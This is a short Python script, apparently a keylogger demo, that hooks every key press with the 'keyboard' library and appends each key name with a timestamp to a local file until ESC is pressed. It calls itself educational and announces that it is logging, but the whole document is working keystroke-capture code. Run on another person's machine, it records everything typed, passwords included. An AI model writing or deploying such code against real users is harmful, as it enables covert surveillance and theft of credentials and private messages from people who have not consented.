import keyboard
import sys
import datetime

LOG_FILE = "keylog.txt"

def on_key_press(event):
    with open(LOG_FILE, "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} - {event.name}\n")

def main():
    print("Simple keylogger (educational purposes only)")
    print(f"Logging to {LOG_FILE}")
    print("Press ESC to stop...")
    
    keyboard.on_press(on_key_press)
    
    # Wait for ESC key to stop
    keyboard.wait('esc')
    
    print("\nLogging stopped.")

if __name__ == "__main__":
    main()